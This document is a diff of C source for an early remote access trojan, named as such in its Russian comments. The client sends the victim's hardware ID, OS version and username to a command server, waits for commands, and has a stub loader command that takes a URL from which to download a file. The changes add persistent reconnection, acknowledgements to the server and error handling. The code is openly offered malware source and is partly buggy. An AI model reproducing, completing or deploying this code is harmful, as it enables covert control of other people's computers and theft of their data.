@@ -22,18 +22,18 @@ struct CLIENTS
 	char USERNAME[100];
 	char OSVER[100];
 	char HWID[100];
-};
+} ;
 
 struct DLE
 {
 	char URL[1000];
-};
+} ;
 
 struct CMDiDATA
 {
 	DWORD CMD;
 	char DATA[4000];
-};
+} ;
 
 void GetHwid(char** hwid)
 {
@@ -65,8 +65,8 @@ void GetHwid(char** hwid)
 
 void GetUsername(char** username)
 {
-	DWORD size = UNLEN + 1;
-	*username = (char*)realloc(*username, UNLEN + 1);
+	DWORD size = UNLEN;
+	*username = (char*)realloc(*username, UNLEN);
 	GetUserNameA(*username, &size);
 }
 
@@ -81,6 +81,10 @@ DWORD WINAPI DLEFUNC(LPVOID url)
 {
 	char *urlarrdfile = (char*)url;
 	printf("na4inau ska4ivanie faula: %s\n", urlarrdfile);
+	CMDiDATA indata; //создаем структуру отвечающую за протокол
+	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
+	indata.CMD = CMD_OTVET_OK;
+	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
 	return 0;
 }
 
@@ -90,15 +94,16 @@ DWORD WINAPI RecvThread(LPVOID param)
 	{
 		CMDiDATA indata; //создаем структуру отвечающую за протокол
 		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //прием сообщения от клиента
+
+		//recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
+		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
 		{
-			printf("cmd recv cmd: %d\n", indata.CMD);
 			switch (indata.CMD)
 			{
 				case CMD_LOADER://если indata.cmd == CMD_LOADER
 				{
 					DLE dle; //инициализируем структуру DLE
-					memset(&dle, 0, sizeof(dle)); //очищаем ее
+					memset(&dle, 0, sizeof(DLE)); //очищаем ее
 					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
 					printf("url: %s\n", dle.URL); //напечатаем пришедший урл
 					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
@@ -108,7 +113,16 @@ DWORD WINAPI RecvThread(LPVOID param)
 					break;
 			}
 		}
+		else {
+			if (10054 == GetLastError())
+			{
+				closesocket(Socket);
+				return 0;
+			}
+			Sleep(1000);
+		}	
 	}
+	return 0;
 }
 
 //будущая точка входа нашего ратника
@@ -129,6 +143,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	struct WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
 	WSAStartup(DLLVersion, &wsaData);
+start:
 	SOCKADDR_IN ServerAddr;
 	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	ServerAddr.sin_family = AF_INET;
@@ -136,6 +151,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	ServerAddr.sin_port = htons(80);
 	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 	//подключаемся к серверу!!!
+
 	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
 	{
 		//если мы подключились то передаем хендшейк:)
@@ -161,6 +177,11 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		printf("sended data :: %s %s %s %s\n", client.HWID, client.OSVER, client.USERNAME);
 		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
 		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
-		//closesocket(Socket);
+		
+		free(hwid);
+		free(user);
+		free(os);
 	}
+	Sleep(10000);
+	goto start;
 }
